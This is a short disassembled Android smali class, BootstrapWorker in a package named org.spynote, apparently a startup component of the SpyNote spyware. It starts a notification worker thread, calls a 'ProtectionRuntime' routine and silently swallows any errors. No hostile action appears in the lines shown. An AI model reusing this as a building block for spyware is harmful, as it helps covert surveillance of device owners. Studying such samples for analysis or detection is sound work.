.class Lorg/spynote/BootstrapWorker;
.super Ljava/lang/Thread;
.source "BootstrapWorker.java"


.field private context:Landroid/content/Context;


.method constructor <init>(Landroid/content/Context;)V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lorg/spynote/BootstrapWorker;->context:Landroid/content/Context;

    return-void
.end method


.method public run()V
    .locals 2

    :try_start_0
    iget-object v0, p0, Lorg/spynote/BootstrapWorker;->context:Landroid/content/Context;

    new-instance v1, Lorg/spynote/NotifyWorker;

    invoke-direct {v1, v0}, Lorg/spynote/NotifyWorker;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1}, Lorg/spynote/NotifyWorker;->start()V

    iget-object v0, p0, Lorg/spynote/BootstrapWorker;->context:Landroid/content/Context;

    invoke-static {v0}, Lorg/spynote/ProtectionRuntime;->apply(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
